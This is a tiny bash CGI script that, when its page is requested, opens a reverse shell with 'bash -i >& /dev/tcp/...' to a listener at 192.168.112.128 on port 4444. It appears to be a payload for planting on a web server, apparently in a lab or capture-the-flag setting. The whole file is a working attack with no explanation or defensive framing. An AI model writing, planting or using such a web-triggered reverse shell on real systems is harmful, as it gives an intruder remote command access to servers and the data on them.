#!/bin/bash
echo "Content-type: text/plain"
echo

LHOST="192.168.112.128"
LPORT=4444

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
